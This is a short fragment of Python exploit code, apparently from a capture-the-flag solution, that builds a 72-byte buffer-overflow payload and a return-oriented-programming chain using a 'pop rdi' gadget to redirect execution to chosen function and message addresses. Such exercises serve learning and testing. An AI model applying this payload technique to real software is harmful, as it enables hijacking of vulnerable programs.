...
payload = get_hacked * 6 # Buffer overflow until we reach the point in memory where we can overwrite the return address -> 72 bytes
...
payload += p64(pop_rdi_gadget, "little") + p64(souldream_address, "little") + b"A" * 8 + p64(dream_msg_address, "little")  # pop rdi; pop rbp; ret
